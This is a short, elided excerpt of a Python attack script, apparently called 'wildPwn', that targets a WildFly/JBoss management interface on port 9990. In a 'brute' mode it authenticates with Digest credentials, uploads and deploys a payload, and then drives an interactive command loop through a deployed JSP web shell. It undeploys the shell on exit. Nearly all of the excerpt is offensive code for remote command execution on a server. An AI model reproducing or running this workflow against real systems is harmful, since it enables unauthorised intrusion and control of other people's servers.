...
if mode == "brute":
    ...
    request = requests.post("http://" + target + ":9990/management/add-content", auth=HTTPDigestAuth(u, p), files=payload)
    ...
    deployPayload   = requests.post("http://" + target + ":9990/management", headers=deployHeader, auth=HTTPDigestAuth(u, p), data=postData)
    ...
    while True:
            ...
            if cmd.strip() == "exit":
                ...
                undeployPayload = requests.post("http://" + target + ":9990/management", headers=deployHeader, auth=HTTPDigestAuth(u, p), data=undeployData)
                checkUndeploy   = requests.get("http://" + target + ":" + port + "/wildPwn/wildPwn.jsp?")
